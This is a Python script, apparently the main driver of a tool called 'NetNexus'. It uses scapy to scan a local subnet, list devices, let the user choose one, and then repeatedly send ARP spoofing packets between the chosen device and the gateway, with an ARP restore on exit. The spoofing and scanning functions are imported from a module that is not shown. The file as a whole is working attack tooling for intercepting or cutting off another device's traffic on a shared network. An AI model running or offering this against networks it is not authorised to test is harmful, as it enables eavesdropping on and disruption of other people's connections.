import scapy.all as scapy
import os
import time
import sys
from core import scanner, spoof

def main():
    scapy.conf.iface = "wlan0" # Verify with 'ip a'
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root.")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"
    device_memory = {} # Persistent list

    while True:
        print("\n" + "="*40)
        print("      NetNexus: Persistent Mode")
        print("="*40)
        
        # Scan and update our memory
        device_memory = scanner.scan(ip_range, device_memory)
        
        # Convert memory to a list for ID selection
        current_list = list(device_memory.values())
        
        print("\nID\tIP Address\t\tDevice Name")
        print("-" * 60)
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 60)
        print("[R] Refresh/Scan  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()

        if user_input == 'c': sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            target_ip = target['ip']
            target_mac = target['mac']

            print(f"[*] Locking onto {target_ip} ({target_mac})...")
            gateway_mac, _ = spoof.get_device_info(gateway_ip)

            packet_count = 0
            while True:
                # We use the MAC address we found earlier, even if it "disappears"
                spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                packet_count += 2
                print(f"\r[+] Packets Sent: {packet_count} | Target: {target_ip}", end="") 
                time.sleep(0.5)
                
        except (ValueError, IndexError):
            print("[-] Invalid Selection.")
        except KeyboardInterrupt:
            print("\n[*] Restoring...")
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)

if __name__ == "__main__":
    main()
